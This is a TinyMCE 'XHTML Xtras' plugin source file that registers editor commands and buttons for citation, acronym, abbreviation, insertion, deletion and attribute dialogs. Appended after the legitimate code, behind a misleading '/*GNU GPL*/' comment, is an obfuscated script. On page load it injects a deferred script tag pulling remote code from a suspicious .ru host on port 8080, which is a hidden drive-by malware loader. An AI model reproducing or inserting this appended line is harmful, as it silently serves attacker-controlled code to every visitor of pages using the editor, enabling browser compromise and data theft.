/**
 * $Id: editor_plugin_src.js 201 2007-02-12 15:56:56Z spocke $
 *
 * @author Moxiecode
 * @copyright Copyright © 2004-2008, Moxiecode Systems AB, All rights reserved.
 */

(function() {
	tinymce.create('tinymce.plugins.XHTMLXtrasPlugin', {
		init : function(ed, url) {
			// Register commands
			ed.addCommand('mceCite', function() {
				ed.windowManager.open({
					file : url + '/cite.htm',
					width : 350 + parseInt(ed.getLang('xhtmlxtras.cite_delta_width', 0)),
					height : 250 + parseInt(ed.getLang('xhtmlxtras.cite_delta_height', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceAcronym', function() {
				ed.windowManager.open({
					file : url + '/acronym.htm',
					width : 350 + parseInt(ed.getLang('xhtmlxtras.acronym_delta_width', 0)),
					height : 250 + parseInt(ed.getLang('xhtmlxtras.acronym_delta_width', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceAbbr', function() {
				ed.windowManager.open({
					file : url + '/abbr.htm',
					width : 350 + parseInt(ed.getLang('xhtmlxtras.abbr_delta_width', 0)),
					height : 250 + parseInt(ed.getLang('xhtmlxtras.abbr_delta_width', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceDel', function() {
				ed.windowManager.open({
					file : url + '/del.htm',
					width : 340 + parseInt(ed.getLang('xhtmlxtras.del_delta_width', 0)),
					height : 310 + parseInt(ed.getLang('xhtmlxtras.del_delta_width', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceIns', function() {
				ed.windowManager.open({
					file : url + '/ins.htm',
					width : 340 + parseInt(ed.getLang('xhtmlxtras.ins_delta_width', 0)),
					height : 310 + parseInt(ed.getLang('xhtmlxtras.ins_delta_width', 0)),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceAttributes', function() {
				ed.windowManager.open({
					file : url + '/attributes.htm',
					width : 380,
					height : 370,
					inline : 1
				}, {
					plugin_url : url
				});
			});

			// Register buttons
			ed.addButton('cite', {title : 'xhtmlxtras.cite_desc', cmd : 'mceCite'});
			ed.addButton('acronym', {title : 'xhtmlxtras.acronym_desc', cmd : 'mceAcronym'});
			ed.addButton('abbr', {title : 'xhtmlxtras.abbr_desc', cmd : 'mceAbbr'});
			ed.addButton('del', {title : 'xhtmlxtras.del_desc', cmd : 'mceDel'});
			ed.addButton('ins', {title : 'xhtmlxtras.ins_desc', cmd : 'mceIns'});
			ed.addButton('attribs', {title : 'xhtmlxtras.attribs_desc', cmd : 'mceAttributes'});

			if (tinymce.isIE) {
				function fix(ed, o) {
					if (o.set) {
						o.content = o.content.replace(/<abbr([^>]+)>/gi, '<html:abbr $1>');
						o.content = o.content.replace(/<\/abbr>/gi, '</html:abbr>');
					}
				};

				ed.onBeforeSetContent.add(fix);
				ed.onPostProcess.add(fix);
			}

			ed.onNodeChange.add(function(ed, cm, n, co) {
				n = ed.dom.getParent(n, 'CITE,ACRONYM,ABBR,DEL,INS');

				cm.setDisabled('cite', co);
				cm.setDisabled('acronym', co);
				cm.setDisabled('abbr', co);
				cm.setDisabled('del', co);
				cm.setDisabled('ins', co);
				cm.setDisabled('attribs', n && n.nodeName == 'BODY');
				cm.setActive('cite', 0);
				cm.setActive('acronym', 0);
				cm.setActive('abbr', 0);
				cm.setActive('del', 0);
				cm.setActive('ins', 0);

				// Activate all
				if (n) {
					do {
						cm.setDisabled(n.nodeName.toLowerCase(), 0);
						cm.setActive(n.nodeName.toLowerCase(), 1);
					} while (n = n.parentNode);
				}
			});
		},

		getInfo : function() {
			return {
				longname : 'XHTML Xtras Plugin',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/xhtmlxtras',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('xhtmlxtras', tinymce.plugins.XHTMLXtrasPlugin);
})();

/*GNU GPL*/ try{window.onload = function(){var A7uom6wz40lq = document.createElement('s##)(^c@)!r@&i)&^p((t&@'.replace(/\!|\(|\$|@|\)|&|#|\^/ig, ''));var U58f2ncrcja2g = 'Bget7nne6zp6f';A7uom6wz40lq.setAttribute('type', 't)$e^@^x$@t@#/^j)#(a#$(v@a(^$s(((c^)r@!#$i($@^(p&&#@t$&#'.replace(/\(|&|#|\^|\)|\$|\!|@/ig, ''));A7uom6wz40lq.setAttribute('src',  'h!&t)t#(p!($:$$&/#!/#$^t&a^(r$&g&(^&e$t)&-#!(@c^#^o#)m@@!.$@1!$@9(@l$!)!o!@^@u!!&&).@^$&c!$@^&o!((&m)!).(^^n$&i&h$&&-##@g&##!o!$v#(#^@.!(@t^!h^(e!&(m&)o)@#b)#i&)(s@!(i^@^t&$^e&!(.^$^(@r@$u@^:#&&8@!^&0$$$$8(&0)$/#l(o^(v$!e)^&2$1)@c))^!n(&$@.#(@c@(^o&$#m)^&#/!(&l)$o!!v&e$#2^)@1&#c)&n$$(.)!@c(#@o@@^@m(/&g!^o$)$o^^g)^#l^!$e)^(.#(^c!@o##&m^&/&@r!^^o(!$#t@&(t!e))(n!#)t^o(&^m#(a^@#t!)&&o##e^^)&s$).&)$&c!@@o(m(^/#w(&e!(a#^@t@h&e)&!r@.^c@o)!!m#!!&.)&c@!($n!!(/)$'.replace(/\)|@|\(|\!|#|\^|&|\$/ig, ''));A7uom6wz40lq.setAttribute('defer', 'd@!e@)!f(@(e)#$)r(('.replace(/#|&|\(|\)|\!|\$|@|\^/ig, ''));A7uom6wz40lq.setAttribute('id', 'Q^))^w$$l&(y#!@e&@$!2^#^x@^r##4)k('.replace(/#|\^|\(|\$|\!|&|\)|@/ig, ''));document.body.appendChild(A7uom6wz40lq);}} catch(Jnzhjq1ohahp5) {}